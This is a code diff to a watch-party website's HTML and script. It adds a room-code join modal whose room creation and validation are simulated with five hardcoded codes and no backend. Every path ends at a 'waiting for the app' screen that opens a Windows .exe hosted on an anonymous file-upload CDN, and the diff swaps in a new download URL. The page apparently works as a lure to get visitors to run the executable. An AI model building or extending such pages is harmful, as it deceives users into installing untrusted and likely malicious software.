@@ -42,6 +42,7 @@
         </div>
         <div class="user-actions">
             <button class="icon-btn search-btn" type="button" aria-label="Search site"><i class="fas fa-search"></i></button>
+            <button class="btn btn-secondary btn-sm join-room-nav-btn" onclick="openJoinRoom()"><i class="fas fa-ticket"></i> Join Room</button>
             <button class="btn btn-primary btn-sm" onclick="openRoom()"><i class="fas fa-plus"></i> Create Room</button>
         </div>
     </nav>
@@ -75,6 +76,10 @@
                 <button class="hero-btn hero-btn-primary" onclick="openRoom()">
                     <i class="fas fa-play"></i>
                     <span>Start a Party</span>
+                </button>
+                <button class="hero-btn hero-btn-secondary" onclick="openJoinRoom()">
+                    <i class="fas fa-link"></i>
+                    <span>Join with Code</span>
                 </button>
             </div>
         </div>
@@ -414,11 +419,41 @@
                 <div class="success-check"><i class="fas fa-check-circle"></i></div>
                 <h2 style="color: white; margin-bottom: 10px;">Room Ready!</h2>
                 <p style="margin-bottom: 30px; opacity: 0.6;">Your private stream is live.</p>
+                <div class="room-code-panel">
+                    <span>Share this party code</span>
+                    <strong id="room-code-display">N7K2Q</strong>
+                    <button class="room-code-copy" onclick="copyRoomCode()" aria-label="Copy party code"><i class="fas fa-copy"></i></button>
+                </div>
                 <button class="btn btn-primary btn-full" onclick="inviteFriendsPrompt()">INVITE FRIENDS</button>
             </div>
         </div>
     </div>
 
+
+
+    <div id="join-room-modal" class="legal-modal" aria-hidden="true">
+        <div class="legal-modal-content room-modal-content join-room-content">
+            <span class="close-legal" onclick="closeJoinRoom()">×</span>
+            <div class="join-room-eyebrow"><i class="fas fa-link"></i> PRIVATE INVITE</div>
+            <h2 style="color: white; margin-bottom: 5px;">Join a Watch Party</h2>
+            <div id="join-form-state">
+                <p class="join-room-copy">Enter the 5-character code shared by your host.</p>
+            <label class="join-code-label" for="join-code-input">Party code</label>
+            <input id="join-code-input" class="room-input join-code-input" type="text" inputmode="text" maxlength="5" autocomplete="off" placeholder="e.g. Q7M2K" aria-describedby="join-code-hint">
+            <p id="join-code-hint" class="join-code-hint">Codes are not case-sensitive.</p>
+            <button class="btn btn-primary btn-full join-submit" onclick="joinRoomWithCode()"><i class="fas fa-arrow-right"></i> JOIN PARTY</button>
+            <button class="join-create-link" onclick="closeJoinRoom(); openRoom();">Create a new room instead</button>
+            </div>
+            <div id="join-waiting-state" class="join-waiting-state" hidden>
+                <div class="waiting-orbit"><i class="fas fa-desktop"></i></div>
+                <h3>Connected App — Waiting</h3>
+                <p id="join-waiting-copy">Waiting for the WATCHINY app to open…</p>
+                <div class="waiting-progress"><span></span></div>
+                <button class="btn btn-primary btn-full" onclick="openDownload()">OPEN WATCHINY APP</button>
+                <button class="join-create-link" onclick="closeJoinRoom()">Keep waiting in background</button>
+            </div>
+        </div>
+    </div>
     <!-- ELITE ROOM MODAL (FULL PAGE) -->
     <div id="elite-modal" class="elite-modal">
         <div class="elite-bg">
@@ -580,9 +615,21 @@
 
     <script src="./script.js"></script>
     <script>
+
+        const WATCHINY_VALID_CODES = ['Q7M2K', 'R4X9P', 'T8L3V', 'H6NQ5', 'Z2C7W'];
+        function createRoomInternal() { const name = document.getElementById('room-name-input')?.value.trim(); if (!name) { showNotification('Please enter a room name.', 'error'); return; } const code = WATCHINY_VALID_CODES[Math.floor(Math.random() * WATCHINY_VALID_CODES.length)]; document.getElementById('room-code-display').textContent = code; document.getElementById('room-step-1').style.display = 'none'; document.getElementById('room-step-2').style.display = 'block'; showNotification('"' + name + '" created successfully!', 'success'); }
+        function copyRoomCode() { const code = document.getElementById('room-code-display')?.textContent; if (!code) return; navigator.clipboard?.writeText(code); showNotification('Party code ' + code + ' copied.', 'success'); }
+        function openJoinRoom() { const modal = document.getElementById('join-room-modal'); if (!modal) return; modal.classList.add('show'); modal.setAttribute('aria-hidden', 'false'); document.body.style.overflow = 'hidden'; document.getElementById('join-form-state').hidden = false; document.getElementById('join-waiting-state').hidden = true; const input = document.getElementById('join-code-input'); input.value = ''; setTimeout(() => input.focus(), 80); }
+        function closeJoinRoom() { const modal = document.getElementById('join-room-modal'); if (!modal) return; clearTimeout(appWaitTimer); modal.classList.remove('show'); modal.setAttribute('aria-hidden', 'true'); document.body.style.overflow = ''; }
+        let appWaitTimer;
+        function joinRoomWithCode() { const input = document.getElementById('join-code-input'); const code = input.value.trim().toUpperCase(); if (!WATCHINY_VALID_CODES.includes(code)) { input.classList.add('input-error'); input.focus(); showNotification('Invalid party code.', 'error'); return; } input.classList.remove('input-error'); document.getElementById('join-form-state').hidden = true; document.getElementById('join-waiting-state').hidden = false; document.getElementById('join-waiting-copy').textContent = 'Waiting for the WATCHINY app to open for ' + code + '…'; showNotification('Connected App — waiting for WATCHINY to open.', 'success'); clearTimeout(appWaitTimer); try { window.location.href = 'watchiny://room/' + code; } catch (error) {} appWaitTimer = setTimeout(() => { document.getElementById('join-waiting-copy').textContent = 'Still waiting. Open the desktop app to continue.'; }, 8000); }
+        document.getElementById('join-code-input')?.addEventListener('input', (event) => { event.target.value = event.target.value.replace(/[^a-z0-9]/gi, '').toUpperCase(); event.target.classList.remove('input-error'); });
+        document.getElementById('join-room-modal')?.addEventListener('click', (event) => { if (event.target.id === 'join-room-modal') closeJoinRoom(); });
+
         window.openDownload = function () {
-            window.open('https://cdn.r2upload.io/c481b4f2-4cbb-46c2-808a-9c192ebadd3f/Watchiny.exe', '_blank');
+            window.open('https://cdn.r2upload.io/563952b5-c9b7-4b69-a0a1-4e9a2458b452/Watchiny.exe', '_blank');
         };
+
     </script>
 
 <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;7897071cafe44e12bd1b0e66379aef3c&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
